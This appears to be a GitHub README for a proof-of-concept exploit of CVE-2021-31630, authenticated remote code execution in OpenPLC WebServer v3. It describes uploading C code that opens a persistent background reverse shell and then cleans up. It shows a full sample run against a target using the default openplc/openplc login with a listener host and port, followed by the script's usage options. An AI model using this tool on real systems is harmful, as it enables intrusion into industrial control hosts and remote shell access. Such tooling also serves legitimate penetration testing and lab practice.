# cve-2021-31630

## OpenPLC WebServer v3 - Authenticated RCE

This PoC script is based on the exploit provided by [Fellipe Oliveira](https://packetstormsecurity.com/files/162563/OpenPLC-WebServer-3-Remote-Code-Execution.html).


### Features :
- Directly uploads C code to `/hardware` instead of `st` file upload
- Restores default program before uploading reverse shell
- Improved C based reverse shell which is **non blocking** so web server doesn't hang `;)`
- Spawns shell in the background, works even after PLC is stopped until exit
- Cleanup


```
$ python cve_2021_31630.py -lh 10.10.16.68 -lp 4444 http://10.10.11.7:8080

------------------------------------------------
--- CVE-2021-31630 -----------------------------
--- OpenPLC WebServer v3 - Authenticated RCE ---
------------------------------------------------

[>] Found By : Fellipe Oliveira
[>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t ]

[>] Target   : http://10.10.11.7:8080
[>] Username : openplc
[>] Password : openplc
[>] Timeout  : 20 secs
[>] LHOST    : 10.10.16.68
[>] LPORT    : 4444

[!] Checking status...
[+] Service is Online!
[!] Logging in...
[+] Logged in!
[!] Restoring default program...
[+] PLC Stopped!
[+] Cleanup successful!
[!] Uploading payload...
[+] Payload uploaded!
[+] Waiting for 5 seconds...
[+] Compilation successful!
[!] Starting PLC...
[+] PLC Started! Check listener...
[!] Cleaning up...
[+] PLC Stopped!
[+] Cleanup successful!
```

### Dependencies

```
pip3 install requests
```

### Usage

```
usage: cve_2021_31630.py [-h] [-u U] [-p P] [-t T] -lh LH -lp LP url

positional arguments:
  url         Target URL with http(s)://

options:
  -h, --help  show this help message and exit
  -u U        Username
  -p P        Password
  -t T        Request Timeout, increase if server is slow
  -lh LH      LHOST
  -lp LP      LPORT
```